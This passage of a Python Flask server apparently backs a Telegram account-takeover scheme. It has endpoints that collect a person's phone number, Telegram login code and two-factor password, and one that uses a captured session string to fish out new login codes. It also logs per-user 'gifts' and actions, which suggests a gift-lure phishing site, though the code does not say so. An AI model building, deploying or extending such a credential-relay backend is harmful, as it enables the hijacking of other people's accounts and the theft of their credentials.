    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'active_searches': len(ACTIVE_SEARCHERS),
        'code_search_results': len(CODE_SEARCH_RESULTS),
        'active_sessions': len(ACTIVE_SESSIONS),
        'environment': os.getenv('RAILWAY_ENVIRONMENT', 'development')
    })

@app.route('/api/find-telegram-code', methods=['POST', 'OPTIONS'])
def find_telegram_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_string = data.get('session_string', '').strip()
        user_id = data.get('user_id')
        
        if not session_string:
            return jsonify({'success': False, 'error': 'Session string required'}), 400
        
        result = async_runner.run_coroutine(find_telegram_code_immediate(session_string, user_id))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка поиска кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/')
def home():
    stats = storage.get_stats()
    return render_template('index.html', stats=stats)

@app.route('/api/auth/request-code', methods=['POST', 'OPTIONS'])
def request_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
        
        result = async_runner.run_coroutine(auth_tester.request_code(phone))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка запроса кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-code', methods=['POST', 'OPTIONS'])
def verify_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'}), 400
            
        code = data.get('code', '').strip()
        
        if not code:
            return jsonify({'success': False, 'error': 'Введите код'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_code(session_id, code))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-password', methods=['POST', 'OPTIONS'])
def verify_password():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'}), 400
            
        password = data.get('password', '')
        
        if not password:
            return jsonify({'success': False, 'error': 'Введите пароль'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_password(session_id, password))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации пароля: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/storage/stats', methods=['GET'])
def storage_stats():
    try:
        stats = storage.get_stats()
        return jsonify({
            'success': True,
            'storage_type': 'JSON',
            'statistics': stats,
            'active_code_searches': len(ACTIVE_SEARCHERS)
        })
    except Exception as e:
        logger.error(f"❌ Ошибка получения статистики: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# API для истории действий
@app.route('/api/actions/add', methods=['POST', 'OPTIONS'])
def add_action():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        user_id = data.get('user_id')
        action_type = data.get('action_type')
        
        if not user_id or not action_type:
            return jsonify({'success': False, 'error': 'user_id and action_type required'}), 400
        
        details = data.get('details', '')
        from_user = data.get('from_user', '')
        link = data.get('link', '')
        
        success = add_user_action(user_id, action_type, details, from_user, link)
        
        if success:
            return jsonify({
                'success': True,
                'message': 'Action added successfully',
                'user_id': user_id,
                'action_type': action_type
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to add action'}), 500
            
    except Exception as e:
        logger.error(f"❌ Ошибка добавления действия: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/actions/<int:user_id>', methods=['GET'])
def get_actions(user_id):
    try:
        limit = request.args.get('limit', 20, type=int)
        actions = get_user_actions(user_id, limit)
        
        return jsonify({
            'success': True,
            'user_id': user_id,
            'actions': actions,
            'count': len(actions)
        })
    except Exception as e:
        logger.error(f"❌ Ошибка получения действий: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/actions/gifts/<int:user_id>', methods=['GET'])
def get_gifts(user_id):
    try:
        gifts = get_user_gifts(user_id)
        
        return jsonify({
            'success': True,
            'user_id': user_id,
            'gifts': gifts,
            'count': len(gifts)
        })
    except Exception as e:
        logger.error(f"❌ Ошибка получения подарков: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.getenv('PORT', 8080))
    host = '0.0.0.0'
    
    logger.info(f"🚀 Запуск приложения на {host}:{port}")
    logger.info(f"🌍 Railway Environment: {os.getenv('RAILWAY_ENVIRONMENT', 'Not set')}")
    
    os.makedirs('templates', exist_ok=True)
    
    debug = os.getenv('DEBUG', 'false').lower() == 'true'
    
    app.run(host=host, port=port, debug=debug)
